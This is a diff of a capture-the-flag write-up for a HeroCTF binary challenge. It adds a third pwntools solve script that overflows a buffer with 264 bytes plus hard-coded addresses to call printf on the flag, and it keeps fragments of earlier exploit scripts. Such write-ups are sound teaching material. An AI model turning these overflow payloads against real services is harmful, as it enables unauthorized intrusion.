@@ -215,7 +215,7 @@ r.sendlineafter(b"secret? ", b"2" * (0x40 - 1))
 # r.interactive()
 log.success(r.recvall().decode())
 ```
-But there was a lot simpler way to do it that I've discovered during the CTF (thanks @voydstack):
+But there was a lot simpler way to do it that I've discovered during the CTF:
 ```py
 from pwn import *
 
@@ -249,6 +249,18 @@ buf += p64(0xfeedbabebaadf00d)
 r.sendafter(b'? ', buf)
 r.interactive()
 ```
+And guess what there was another lot lot easiest way to do it by just calling `printf(flag)` (yes, I'm devastated, but that's the game):
+```py
+from pwn import *
+
+r = remote("aargh.heroctf.fr", 1337)
+
+print(r.readuntil("? "))
+
+r.sendline(b'i' * 264 + p64(0x4006d0) + p64(0x400810) * 32)
+r.interactive()
+```
+
 Result of my script's execution:
 ```bash
 $ python3 solve.py 
